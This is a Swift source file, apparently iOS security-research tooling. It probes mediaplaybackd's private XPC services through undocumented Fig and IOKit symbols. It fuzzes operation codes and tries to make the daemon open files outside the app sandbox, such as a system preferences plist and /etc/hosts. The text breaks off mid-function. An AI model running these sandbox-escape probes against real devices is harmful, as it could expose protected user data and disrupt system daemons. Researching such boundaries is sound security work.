import Darwin
import Metal
import CoreGraphics
import ImageIO
import IOSurface
import AVFoundation
import VideoToolbox
import CoreVideo
//
//  XPCProbe.swift
//  Bench27
//
//  mediaplaybackd XPC surface work, moved into our own app so there is a single
//  build and a single place for the code.
//
//  Three things:
//    1. surface()  - bootstrap_look_up over the mediaplaybackd service list and
//                    an exact report of the returned code (no collapsing);
//    2. connect()  - open a service, send the FigXPC envelope, print the reply;
//    3. serve()    - act as a custom-URL-handler *server*: publish our own
//                    endpoint, hand it to mediaplaybackd's customurlloader
//                    service, then log every request the daemon sends us.
//
//  The last part is the interesting one: once the daemon accepts our endpoint it
//  drives the exchange from its side, which tells us the real protocol without
//  guessing codes.
//

import Foundation
import UIKit
typealias io_service_t = UInt32
typealias io_iterator_t = UInt32
typealias io_connect_t = UInt32
typealias kern_return_t = Int32


@_silgen_name("IOConnectCallMethod")
func xq_IOConnectCallMethod(_ conn: io_connect_t, _ sel: UInt32, _ input: UnsafePointer<UInt64>?, _ inputCnt: UInt32, _ inputStruct: UnsafeRawPointer?, _ inputStructCnt: Int, _ output: UnsafeMutablePointer<UInt64>?, _ outputCnt: UnsafeMutablePointer<UInt32>?, _ outputStruct: UnsafeMutableRawPointer?, _ outputStructCnt: UnsafeMutablePointer<Int>) -> kern_return_t

@_silgen_name("IOServiceMatching")
func xq_IOServiceMatching(_ name: UnsafePointer<CChar>) -> UnsafeMutableRawPointer?
@_silgen_name("IOServiceGetMatchingServices")
func xq_IOServiceGetMatchingServices(_ port: mach_port_t, _ matching: UnsafeMutableRawPointer?, _ existing: UnsafeMutablePointer<io_iterator_t>) -> kern_return_t
@_silgen_name("IOIteratorNext")
func xq_IOIteratorNext(_ it: io_iterator_t) -> io_service_t
@_silgen_name("IOObjectRelease")
func xq_IOObjectRelease(_ obj: UInt32) -> kern_return_t
@_silgen_name("IOSurfaceAcceleratorCreate")
func xq_IOSurfaceAcceleratorCreate(_ alloc: CFAllocator?, _ options: CFDictionary?, _ out: UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32

@_silgen_name("IOSurfaceAcceleratorTransferSurface")
func xq_IOSurfaceAcceleratorTransferSurface(_ accel: UnsafeMutableRawPointer?, _ src: IOSurfaceRef, _ dst: IOSurfaceRef, _ options: CFDictionary?, _ completion: UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32

@_silgen_name("fsgetpath")
func xq_fsgetpath(_ buf: UnsafeMutablePointer<CChar>?, _ bufsize: Int, _ fsid: UnsafePointer<fsid_t>?, _ objid: UInt64) -> Int

@_silgen_name("mach_vm_region")
func xq_mach_vm_region(_ target: vm_map_t,
                       _ address: UnsafeMutablePointer<mach_vm_address_t>,
                       _ size: UnsafeMutablePointer<mach_vm_size_t>,
                       _ flavor: vm_region_flavor_t,
                       _ info: UnsafeMutablePointer<integer_t>,
                       _ count: UnsafeMutablePointer<mach_msg_type_number_t>,
                       _ object: UnsafeMutablePointer<mach_port_t>) -> kern_return_t

@_silgen_name("IOServiceOpen")
func xq_IOServiceOpen(_ svc: io_service_t, _ task: mach_port_t, _ type: UInt32, _ conn: UnsafeMutablePointer<io_connect_t>) -> kern_return_t
@_silgen_name("IOServiceClose")
func xq_IOServiceClose(_ conn: io_connect_t) -> kern_return_t
@_silgen_name("IORegistryEntryGetName")
func xq_IORegistryEntryGetName(_ entry: io_service_t, _ name: UnsafeMutablePointer<CChar>) -> kern_return_t
@_silgen_name("IOObjectGetClass")
func xq_IOObjectGetClass(_ obj: io_service_t, _ name: UnsafeMutablePointer<CChar>) -> kern_return_t
@_silgen_name("IORegistryEntryCreateCFProperties")
func xq_IORegistryEntryCreateCFProperties(_ entry: io_service_t, _ props: UnsafeMutablePointer<Unmanaged<CFMutableDictionary>?>, _ alloc: CFAllocator?, _ opts: UInt32) -> kern_return_t
@_silgen_name("IOConnectCallAsyncMethod")
func xq_IOConnectCallAsyncMethod(_ conn: io_connect_t, _ sel: UInt32, _ wake: mach_port_t, _ ref: UnsafeMutablePointer<UInt64>?, _ refCnt: UInt32, _ input: UnsafePointer<UInt64>?, _ inputCnt: UInt32, _ inputStruct: UnsafeRawPointer?, _ inputStructCnt: Int, _ output: UnsafeMutablePointer<UInt64>?, _ outputCnt: UnsafeMutablePointer<UInt32>?, _ outputStruct: UnsafeMutableRawPointer?, _ outputStructCnt: UnsafeMutablePointer<Int>) -> kern_return_t

@_silgen_name("IOConnectSetNotificationPort")
func xq_IOConnectSetNotificationPort(_ conn: io_connect_t, _ type: UInt32, _ port: mach_port_t, _ reference: UInt) -> kern_return_t

@_silgen_name("IOConnectCallScalarMethod")
func xq_IOConnectCallScalarMethod(_ conn: io_connect_t, _ sel: UInt32, _ input: UnsafePointer<UInt64>?, _ ic: UInt32, _ output: UnsafeMutablePointer<UInt64>?, _ oc: UnsafeMutablePointer<UInt32>?) -> kern_return_t


typealias XObj = OpaquePointer

@_silgen_name("bootstrap_port")
var bootstrap_port: UInt32

@_silgen_name("bootstrap_look_up")
func bootstrap_look_up(_ bp: UInt32, _ service: UnsafePointer<CChar>,
                       _ sp: UnsafeMutablePointer<UInt32>) -> Int32

@_silgen_name("mach_port_deallocate")
func mach_port_deallocate(_ task: UInt32, _ name: UInt32) -> Int32

@_silgen_name("dispatch_get_global_queue")
func xq_global_queue(_ id: Int, _ flags: UInt) -> OpaquePointer?

@_silgen_name("xpc_connection_create_from_endpoint")
func xq_connection_from_endpoint(_ ep: XObj?, _ q: OpaquePointer?) -> XObj?

@_silgen_name("xpc_connection_create")
func xq_connection_create(_ name: UnsafePointer<CChar>?, _ q: OpaquePointer?) -> XObj?

@_silgen_name("xpc_connection_create_mach_service")
func xq_connection_create_service(_ name: UnsafePointer<CChar>, _ q: OpaquePointer?, _ flags: UInt64) -> XObj?

@_silgen_name("xpc_connection_set_event_handler")
func xq_set_event_handler(_ c: XObj?, _ h: @escaping @convention(block) (XObj?) -> Void)

@_silgen_name("xpc_connection_resume")
func xq_resume(_ c: XObj?)

@_silgen_name("xpc_connection_cancel")
func xq_cancel(_ c: XObj?)

@_silgen_name("xpc_endpoint_create")
func xq_endpoint_create(_ c: XObj?) -> XObj?

@_silgen_name("xpc_dictionary_create")
func xq_dictionary_create(_ keys: UnsafePointer<UnsafePointer<CChar>?>?,
                          _ values: UnsafePointer<XObj?>?,
                          _ count: Int) -> XObj?

@_silgen_name("xpc_dictionary_set_uint64")
func xq_dictionary_set_uint64(_ d: XObj?, _ k: UnsafePointer<CChar>, _ v: UInt64)

@_silgen_name("xpc_dictionary_set_int64")
func xq_dictionary_set_int64(_ d: XObj?, _ k: UnsafePointer<CChar>, _ v: Int64)

@_silgen_name("xpc_dictionary_set_string")
func xq_dictionary_set_string(_ d: XObj?, _ k: UnsafePointer<CChar>, _ v: UnsafePointer<CChar>)



@_silgen_name("FigSandboxRegistrationCreateWithURLOnSelfGrantingReadWriteAccess")
func fig_sbx_create(_ url: CFURL?, _ flags: UInt32, _ out: UnsafeMutablePointer<XObj?>) -> Int32

@_silgen_name("FigXPCMessageSetSandboxRegistration")
func fig_message_set_sbx(_ msg: XObj?, _ key: UnsafePointer<CChar>, _ reg: XObj?) -> Int32

@_silgen_name("FigXPCMessageSetCFURL")
func fig_message_set_cfurl(_ msg: XObj?, _ key: UnsafePointer<CChar>, _ url: CFURL?) -> Int32



@_silgen_name("xpc_data_get_length")
func xq_data_len(_ d: XObj?) -> Int

@_silgen_name("xpc_data_get_bytes_ptr")
func xq_data_bytes(_ d: XObj?) -> UnsafePointer<UInt8>?


@_silgen_name("xpc_dictionary_set_double")
func xq_dictionary_set_double(_ d: XObj?, _ k: UnsafePointer<CChar>, _ v: Double)


@_silgen_name("xpc_mach_send_copy_right")
func xq_mach_send_copy_right(_ x: XObj) -> mach_port_t
@_silgen_name("mach_port_deallocate")
func xq_mach_port_deallocate(_ task: mach_port_t, _ name: mach_port_t) -> Int32

@_silgen_name("xpc_array_get_count")
func xq_array_get_count(_ a: XObj?) -> Int

@_silgen_name("xpc_array_get_uint64")
func xq_array_get_uint64(_ a: XObj?, _ i: Int) -> UInt64

@_silgen_name("xpc_string_get_string_ptr")
func xq_string_ptr(_ s: XObj?) -> UnsafePointer<CChar>?

@_silgen_name("xpc_null_create")
func xq_null_create() -> XObj?

@_silgen_name("xpc_string_create")
func xq_string_create(_ s: UnsafePointer<CChar>) -> XObj?

@_silgen_name("xpc_int64_create")
func xq_int64_make(_ v: Int64) -> XObj?

@_silgen_name("xpc_array_append_value")
func xq_array_append_value(_ a: XObj?, _ v: XObj?)

@_silgen_name("xpc_array_create")
func xq_array_create(_ objects: UnsafeMutablePointer<XObj?>?, _ count: Int) -> XObj?

func xq_array_append_int64(_ a: XObj?, _ v: Int64) {
    let n = xq_int64_make(v)
    xq_array_append_value(a, n)
    xq_release(n)
}

@_silgen_name("xpc_data_create")
func xq_data_create(_ buf: UnsafeRawPointer?, _ len: Int) -> XObj?

@_silgen_name("xpc_fd_create")
func xq_fd_create(_ fd: Int32) -> XObj?

@_silgen_name("xpc_dictionary_set_value")
func xq_dictionary_set_value(_ d: XObj?, _ k: UnsafePointer<CChar>, _ v: XObj?)

@_silgen_name("xpc_dictionary_get_value")
func xq_dictionary_get_value(_ d: XObj?, _ k: UnsafePointer<CChar>) -> XObj?

@_silgen_name("xpc_dictionary_get_uint64")
func xq_dictionary_get_uint64(_ d: XObj?, _ k: UnsafePointer<CChar>) -> UInt64

@_silgen_name("xpc_dictionary_get_string")
func xq_dictionary_get_string(_ d: XObj?, _ k: UnsafePointer<CChar>) -> UnsafePointer<CChar>?

@_silgen_name("xpc_dictionary_get_int64")
func xq_dictionary_get_int64(_ d: XObj?, _ k: UnsafePointer<CChar>) -> Int64

@_silgen_name("xpc_dictionary_create_reply")
func xq_reply_create(_ m: XObj?) -> XObj?

@_silgen_name("xpc_dictionary_get_remote_connection")
func xq_remote_connection(_ m: XObj?) -> XObj?

@_silgen_name("xpc_connection_send_message")
func xq_send(_ c: XObj?, _ m: XObj?)

@_silgen_name("xpc_connection_send_message_with_reply")
func xq_send_with_reply(_ c: XObj?, _ m: XObj?, _ q: OpaquePointer?,
                        _ h: @escaping @convention(block) (XObj?) -> Void)

@_silgen_name("xpc_connection_send_message_with_reply_sync")
func xq_send_sync(_ c: XObj?, _ m: XObj?) -> XObj?

@_silgen_name("xpc_get_type")
func xq_get_type(_ o: XObj?) -> OpaquePointer?

@_silgen_name("xpc_copy_description")
func xq_copy_description(_ o: XObj?) -> UnsafeMutablePointer<CChar>?

@_silgen_name("xpc_release")
func xq_release(_ o: XObj?)

final class XPCProbe {

    static let shared = XPCProbe()
    private init() {}

    private let queue = xq_global_queue(0, 0)
    /// FigXPC server endpoint produced when the memory origin fills message 1.
    private var capturedMemoryEp: XObj?
    private var listener: XObj?

    /// All probe output carries a device-local timestamp with milliseconds so a
    /// line in probe.log can be matched against a crash report's wall clock.
    private static let stamp: DateFormatter = {
        let f = DateFormatter()
        f.dateFormat = "yyyy-MM-dd HH:mm:ss.SSS"
        f.locale = Locale(identifier: "en_US_POSIX")
        f.timeZone = TimeZone.current
        return f
    }()

    private func emit(_ s: String) {
        Logger.shared.log(s)
    }

    /// Sync send with a bound. A dropped connection never replies, and the
    /// plain sync call waits forever, which is what froze the main thread and
    /// got the app killed by the scene-update watchdog.
    ///
    /// The blocking call itself runs on a throwaway queue: we wait for it with
    /// a timeout, and if the peer never answers we simply stop waiting instead
    /// of stalling the caller.
    private func sendSync(_ conn: XObj?, _ msg: XObj?, timeout: Double = 3.0) -> XObj? {
        let sem = DispatchSemaphore(value: 0)
        var result: XObj?
        DispatchQueue.global(qos: .userInitiated).async {
            let reply = xq_send_sync(conn, msg)
            result = reply
            sem.signal()
        }
        if sem.wait(timeout: .now() + timeout) == .timedOut {
            return nil
        }
        return result
    }

    private func describe(_ o: XObj?) -> String {
        guard let o, let c = xq_copy_description(o) else { return "<null>" }
        defer { free(c) }
        return String(cString: c)
    }

    private static let services = [
        "com.apple.coremedia.mediaplaybackd.customurlloader.xpc",
        "com.apple.coremedia.mediaplaybackd.bytestream.xpc",
        "com.apple.coremedia.mediaplaybackd.formatreader.xpc",
        "com.apple.coremedia.mediaplaybackd.player.xpc",
        "com.apple.coremedia.mediaplaybackd.asset.xpc",
        "com.apple.coremedia.mediaplaybackd.sandboxserver.xpc"
    ]

    // MARK: - level 1/2

    func surface() {
        emit("xpc: lookup sweep")
        var open = 0
        for name in XPCProbe.services {
            var port: UInt32 = 0
            let rc = name.withCString { bootstrap_look_up(bootstrap_port, $0, &port) }
            let verdict: String
            switch rc {
            case 0:    verdict = "SUCCESS"; open += 1
            case 1100: verdict = "NOT_PRIVILEGED"
            case 1102: verdict = "UNKNOWN_SERVICE"
            default:   verdict = "code \(rc)"
            }
            emit("xpc:   \(name) -> \(rc) \(verdict)")
            if rc == 0 { mach_port_deallocate(mach_task_self_, port) }
        }
        emit("xpc: open \(open) of \(XPCProbe.services.count)")
    }

    // MARK: - level 3 (client side)

    /// Ping-only connectivity check.
    ///
    /// It deliberately does NOT hand the daemon an endpoint: the daemon answers
    /// a ping in milliseconds, whereas an endpoint request makes it build a
    /// remote client and wait for a pong we are not yet ready to produce. That
    /// wait ends in an RPC timeout, and the server then self-terminates the
    /// connection, which is what left mediaplaybackd unresponsive afterwards.
    func connect() {
        emit("xpc: connect probe (ping only)")
        for name in XPCProbe.services.prefix(3) {
            guard let conn = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { continue }
            xq_set_event_handler(conn) { _ in }
            xq_resume(conn)

            guard let msg = xq_dictionary_create(nil, nil, 0) else { xq_release(conn); continue }
            ".Operation".withCString { xq_dictionary_set_uint64(msg, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(msg, k, v) }
            }
            ".IsDaemon".withCString { xq_dictionary_set_uint64(msg, $0, 0) }
            let rep = sendSync(conn, msg, timeout: 5.0)
            emit("xpc: \(name) ping -> \(describe(rep))")
            if let rep { xq_release(rep) }
            xq_release(msg)
            xq_cancel(conn)
            xq_release(conn)
        }
    }

    // MARK: - byte stream creation (the interesting surface)

    /// Asks mediaplaybackd to open a URL as a byte stream.
    ///
    /// _byteStreamServer_HandleCreateWithURLMessage reads "CreationURL" and an
    /// OPTIONAL "SandboxRegistrationForCreationURL", consumes the registration
    /// only when present, then creates the stream with the daemon's own
    /// privileges. The creation opcodes ("Curl"/"Cobj") are dispatched before
    /// the object lookup, so no server-side object is needed.
    ///
    /// Two URLs are tried: a file inside our own container as a control, and a
    /// path outside it that this app cannot read itself.
    func byteStreamCreate() {
        emit("xpcf: byte stream creation probe")
        guard let conn = "com.apple.coremedia.mediaplaybackd.bytestream.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xpcf: connection failed"); return
        }
        xq_set_event_handler(conn) { _ in }
        xq_resume(conn)
        defer { xq_cancel(conn); xq_release(conn) }

        // ping first, as any FigXPC client does
        var token: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            ".IsDaemon".withCString { xq_dictionary_set_uint64(ping, $0, 0) }
            if let reply = sendSync(conn, ping, timeout: 5.0) {
                token = ".Token".withCString { xq_dictionary_get_int64(reply, $0) }
                emit("xpcf: ping token=\(token)")
                xq_release(reply)
            } else {
                emit("xpcf: ping got no reply")
            }
            xq_release(ping)
        }

        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let targets = [
            ("own-container", "file://" + docs.appendingPathComponent("probe.log").path),
            ("outside", "file:///private/var/mobile/Library/Preferences/com.apple.mobiletimer.plist"),
            ("system", "file:///etc/hosts")
        ]

        // The daemon answers -16159 for every URL, which is a message-shape
        // rejection rather than a path decision, so several shapes are tried.
        let (_, outsideURL) = targets[1]
        let shapes: [(String, Bool, Int64, UInt64)] = [
            ("token",      true,  -1, 0),
            ("bare",       false, -1, 0),
            ("obj0",       true,   0, 0),
            ("obj0+opts",  true,   0, 0)
        ]
        for (label, useToken, objID, _) in shapes {
            guard let msg = xq_dictionary_create(nil, nil, 0) else { continue }
            ".Operation".withCString { xq_dictionary_set_uint64(msg, $0, 0x4375726c) }  // "Curl"
            if useToken && token != 0 {
                ".Token".withCString { xq_dictionary_set_int64(msg, $0, token) }
            }
            if objID >= 0 {
                ".objectID".withCString { xq_dictionary_set_int64(msg, $0, objID) }
            }
            if label == "obj0+opts" {
                "FileOpenOptions".withCString { xq_dictionary_set_uint64(msg, $0, 0) }
            }
            "CreationURL".withCString { k in
                outsideURL.withCString { v in xq_dictionary_set_string(msg, k, v) }
            }
            let rep = sendSync(conn, msg, timeout: 6.0)
            if let rep {
                let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(rep, $0) }
                let obj = ".objectID".withCString { xq_dictionary_get_int64(rep, $0) }
                emit("xpcf: shape=\(label) -> ErrorReturn=\(err) objectID=\(obj)")
                xq_release(rep)
            } else {
                emit("xpcf: shape=\(label) -> no reply")
            }
            xq_release(msg)
            Thread.sleep(forTimeInterval: 0.3)
        }

        for (label, urlString) in targets {
            guard let msg = xq_dictionary_create(nil, nil, 0) else { continue }
            ".Operation".withCString { xq_dictionary_set_uint64(msg, $0, 0x4375726c) }  // "Curl"
            if token != 0 {
                ".Token".withCString { xq_dictionary_set_int64(msg, $0, token) }
            }
            "CreationURL".withCString { k in
                urlString.withCString { v in xq_dictionary_set_string(msg, k, v) }
            }
            let rep = sendSync(conn, msg, timeout: 6.0)
            if let rep {
                let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(rep, $0) }
                let obj = ".objectID".withCString { xq_dictionary_get_int64(rep, $0) }
                emit("xpcf: \(label) url=\(urlString)")
                emit("xpcf:   -> ErrorReturn=\(err) objectID=\(obj)")
                emit("xpcf:   raw = \(describe(rep))")
                xq_release(rep)
            } else {
                emit("xpcf: \(label) -> no reply")
            }
            xq_release(msg)
            Thread.sleep(forTimeInterval: 0.4)
        }
        emit("xpcf: done")
    }

    // MARK: - format reader creation ("FCBS")

    /// Creates a format reader inside the daemon from a byte stream description.
    ///
    /// _byteStreamServer_HandleMessage's counterpart in formatreader dispatches
    /// on opcode 0x46434253 ("FCBS") and reads:
    ///   "ByteStreamDetails"      (CFDictionary, required)
    ///   "SelectionOptions"       (optional)
    ///   "InstantiationOptions"   (optional)
    /// The details dictionary keys are kFigRemoteByteStreamDetail_* - URL,
    /// FileDescriptor, ServerEndpoint, ObjectID and friends.
    ///
    /// This is the app-facing creation path, so no pre-existing server object
    /// should be needed.
    func formatReaderCreate() {
        emit("xpcfr: format reader creation probe")
        guard let conn = "com.apple.coremedia.mediaplaybackd.formatreader.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xpcfr: connection failed"); return
        }
        xq_set_event_handler(conn) { _ in }
        xq_resume(conn)
        defer { xq_cancel(conn); xq_release(conn) }

        var token: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            ".IsDaemon".withCString { xq_dictionary_set_uint64(ping, $0, 0) }
            if let reply = sendSync(conn, ping, timeout: 5.0) {
                token = ".Token".withCString { xq_dictionary_get_int64(reply, $0) }
                emit("xpcfr: ping token=\(token)")
                xq_release(reply)
            } else {
                emit("xpcfr: ping got no reply")
            }
            xq_release(ping)
        }

        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let targets = [
            ("own-container", "file://" + docs.appendingPathComponent("probe.log").path),
            ("outside", "file:///private/var/mobile/Library/Preferences/com.apple.mobiletimer.plist")
        ]

        // Before any application request, try the client-establishment message
        // that other FigXPC services use ("cre8", 0x63726538). If the server
        // creates its served-state here, the formatreaderObject connection
        // property should appear and FCBS can proceed.
        if let cre = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(cre, $0, 0x63726538) }
            if token != 0 { ".Token".withCString { xq_dictionary_set_int64(cre, $0, token) } }
            ".DebugName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(cre, k, v) }
            }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(cre, k, v) }
            }
            let cr = sendSync(conn, cre, timeout: 6.0)
            emit("xpcfr: cre8 -> \(describe(cr))")
            if let cr { xq_release(cr) }
            xq_release(cre)
        }

        // Control: an empty details dictionary. If this returns the same code as
        // the populated variants, the failure happens before the details are
        // parsed at all.
        if let det = xq_dictionary_create(nil, nil, 0) {
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x46434253) }
                if token != 0 { ".Token".withCString { xq_dictionary_set_int64(m, $0, token) } }
                "ByteStreamDetails".withCString { xq_dictionary_set_value(m, $0, det) }
                let r = sendSync(conn, m, timeout: 6.0)
                emit("xpcfr: empty-details FCBS -> \(describe(r))")
                if let r { xq_release(r) }
                xq_release(m)
            }
            xq_release(det)
        }

        // Try the ObjectID form first: if the served state is only built for
        // self-contained sources (URL, endpoint, descriptor), referencing an
        // existing object may take a different branch.
        if let det = xq_dictionary_create(nil, nil, 0) {
            "ObjectID".withCString { xq_dictionary_set_int64(det, $0, 0) }
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x46434253) }
                if token != 0 { ".Token".withCString { xq_dictionary_set_int64(m, $0, token) } }
                "ByteStreamDetails".withCString { xq_dictionary_set_value(m, $0, det) }
                let r = sendSync(conn, m, timeout: 6.0)
                emit("xpcfr: objectID FCBS -> \(describe(r))")
                if let r { xq_release(r) }
                xq_release(m)
            }
            xq_release(det)
        }

        // The details dictionary also accepts a raw file descriptor. That path
        // skips the memory handshake entirely: the daemon reads from the
        // descriptor we opened, so no .rp1/.rp2/cre8 exchange is needed.
        if let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4") {
            let fd = open(mp4.path, O_RDONLY)
            if fd >= 0 {
                emit("xpcfr: descriptor path via \(mp4.lastPathComponent) fd=\(fd)")
                if let fdo = xq_fd_create(fd) {
                    if let det = xq_dictionary_create(nil, nil, 0) {
                        "FileDescriptor".withCString { xq_dictionary_set_value(det, $0, fdo) }
                        // The details parser reads lengths and flags alongside the
                        // descriptor, so supply them rather than leaving them unset.
                        let attrs = try? FileManager.default.attributesOfItem(atPath: mp4.path)
                        let size = (attrs?[.size] as? NSNumber)?.int64Value ?? 0
                        emit("xpcfr: sample size = \(size)")
                        "EntireLength".withCString { xq_dictionary_set_int64(det, $0, size) }
                        "EntireLengthAvailable".withCString { xq_dictionary_set_int64(det, $0, 1) }
                        "ReadsMayBlockIndefinitely".withCString { xq_dictionary_set_int64(det, $0, 1) }
                        "Writable".withCString { xq_dictionary_set_int64(det, $0, 0) }
                        if let m = xq_dictionary_create(nil, nil, 0) {
                            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x46434253) }
                            if token != 0 { ".Token".withCString { xq_dictionary_set_int64(m, $0, token) } }
                            "ByteStreamDetails".withCString { xq_dictionary_set_value(m, $0, det) }
                            // The handler copies both option dictionaries before it
                            // creates the reader; supply them explicitly.
                            if let so = xq_dictionary_create(nil, nil, 0) {
                                "SelectionOptions".withCString { xq_dictionary_set_value(m, $0, so) }
                                xq_release(so)
                            }
                            if let io = xq_dictionary_create(nil, nil, 0) {
                                "InstantiationOptions".withCString { xq_dictionary_set_value(m, $0, io) }
                                xq_release(io)
                            }
                            let r = sendSync(conn, m, timeout: 8.0)
                            emit("xpcfr: descriptor FCBS -> \(describe(r))")
                            if let r { xq_release(r) }
                            xq_release(m)
                        }
                        xq_release(det)
                    }
                    xq_release(fdo)
                } else {
                    emit("xpcfr: xpc_fd_create failed")
                }
            } else {
                emit("xpcfr: open failed for the bundled sample")
            }
        } else {
            emit("xpcfr: bundled sample missing")
        }

        for (label, urlString) in targets {
            guard let details = xq_dictionary_create(nil, nil, 0) else { continue }
            "URL".withCString { k in
                urlString.withCString { v in xq_dictionary_set_string(details, k, v) }
            }

            guard let msg = xq_dictionary_create(nil, nil, 0) else { xq_release(details); continue }
            ".Operation".withCString { xq_dictionary_set_uint64(msg, $0, 0x46434253) }  // "FCBS"
            if token != 0 {
                ".Token".withCString { xq_dictionary_set_int64(msg, $0, token) }
            }
            "ByteStreamDetails".withCString { xq_dictionary_set_value(msg, $0, details) }
            if let so = xq_dictionary_create(nil, nil, 0) {
                "SelectionOptions".withCString { xq_dictionary_set_value(msg, $0, so) }
                xq_release(so)
            }
            if let io = xq_dictionary_create(nil, nil, 0) {
                "InstantiationOptions".withCString { xq_dictionary_set_value(msg, $0, io) }
                xq_release(io)
            }
            let rep = sendSync(conn, msg, timeout: 8.0)
            if let rep {
                let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(rep, $0) }
                let obj = ".objectID".withCString { xq_dictionary_get_int64(rep, $0) }
                emit("xpcfr: \(label) -> ErrorReturn=\(err) objectID=\(obj)")
                emit("xpcfr:   raw = \(describe(rep))")
                xq_release(rep)
            } else {
                emit("xpcfr: \(label) -> no reply")
            }
            xq_release(msg)
            xq_release(details)
            Thread.sleep(forTimeInterval: 0.4)
        }
        emit("xpcfr: done")
    }

    /// Neutral callback used to fill the FigXPC client callback table.
    private let xqStubCallback: @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?) -> Int32 = { _, _ in 0 }

    func sweepMissingFields() {
        emit("xsw: sweep missing fields")
        let services = [
            "formatreader", "bytestream", "customurlloader", "samplegenerator",
            "assetimagegenerator", "mutablecomposition", "mutablemovie",
            "cpe", "cpeprotector", "figcontentkeyboss", "figcontentkeysession",
            "figcpecryptor", "videocompositor", "videotarget", "visualcontext",
            "remaker", "player", "asset", "assetcacheinspector",
            "audioprocessingtap", "samplebufferrendersynchronizer",
            "samplebufferaudiorenderer", "figmetriceventtimeline",
        ]
        let ops: [(String, UInt64)] = [
            ("cre8", 0x63726538), ("crea", 0x63726561), ("pars", 0x70617273),
            ("cpdt", 0x63706474), (".set", 0x2e736574), (".cpy", 0x2e637079),
            ("outp", 0x6f757470), ("FCBS", 0x46434253), ("Fcr8", 0x46637238),
        ]
        for svc in services {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else {
                emit("xsw: \(svc): no connection"); continue
            }
            xq_set_event_handler(c) { [weak self] e in
            guard let self else { return }
            let d = self.describe(e)
            if d.contains("assetProperty_Tracks") || d.contains("assetTrackNotice") {
                self.emit("xfz2: EV \(d)")
            }
        }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 3.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            if tok == 0 { emit("xsw: \(svc): no token"); xq_release(c); continue }
            var line = "xsw: \(svc)"
            for (label, code) in ops {
                if let m = xq_dictionary_create(nil, nil, 0) {
                    ".Operation".withCString { xq_dictionary_set_uint64(m, $0, code) }
                    ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
                    let r = sendSync(c, m, timeout: 3.0)
                    if let r {
                        let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                        line += " \(label)=\(e)"
                        xq_release(r)
                    } else {
                        line += " \(label)=none"
                    }
                    xq_release(m)
                }
                Thread.sleep(forTimeInterval: 0.15)
            }
            emit(line)
            xq_cancel(c); xq_release(c)
        }
        emit("xsw: done")
    }

    func sixObjectsProbe() {
        emit("x6: create on the six services that accept a bare crea")
        let services = ["mutablecomposition", "cpe", "videocompositor",
                        "visualcontext", "samplebufferrendersynchronizer",
                        "samplebufferaudiorenderer"]
        for svc in services {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else {
                emit("x6: \(svc): no connection"); continue
            }
            xq_set_event_handler(c) { _ in }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 3.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            guard tok != 0 else { emit("x6: \(svc): no token"); xq_release(c); continue }

            var oid: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
                if let r = sendSync(c, m, timeout: 5.0) {
                    oid = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    emit("x6: \(svc) id=\(oid)")
                    emit("x6:   \(describe(r))")
                    xq_release(r)
                }
                xq_release(m)
            }

            if oid != 0 && svc == "mutablecomposition" {
                for op in ["addt", "inst", "ias ", "adfr", "cptp", ".set", ".cpy"] {
                    let fourcc = op.utf8.reduce(UInt32(0)) { ($0 << 8) | UInt32($1) }
